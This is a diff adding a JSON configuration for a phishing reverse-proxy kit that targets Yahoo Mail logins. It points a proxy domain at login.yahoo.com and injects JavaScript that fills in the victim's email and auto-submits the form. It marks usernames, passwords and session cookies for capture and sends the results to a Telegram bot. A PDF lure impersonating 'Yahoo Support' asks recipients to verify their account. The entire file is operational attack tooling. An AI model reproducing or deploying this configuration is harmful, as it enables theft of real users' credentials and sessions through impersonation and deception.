@@ -1,0 +1,16 @@
+{
+    "proxyDomain": "y.yourdomain.com",
+    "target": "https://login.yahoo.com",
+    "trackingCookie": "session_id",
+    "jsRules": "const email=decodeURIComponent(window.location.hash.slice(1));if(document.querySelector('input[name=username]')){document.querySelector('input[name=username]').value=email;setTimeout(()=>{document.querySelector('form')?.dispatchEvent(new Event('submit',{bubbles:true}));},500);}",
+    "captureFields": ["username", "password"],
+    "telegramBotToken": "YOUR_BOT_TOKEN",
+    "telegramChatId": "YOUR_CHAT_ID",
+    "serviceName": "Yahoo Mail",
+    "cookieCapture": ["YSC", "SID", "SSID"],
+    "pdfTemplate": {
+        "title": "Yahoo Account Verification",
+        "body": "Dear User,\n\nWe need to verify your Yahoo account to ensure uninterrupted access.\n\nClick here to verify: {link}\n\nSincerely,\nYahoo Support",
+        "filename": "Yahoo_Verify.pdf"
+    }
+}
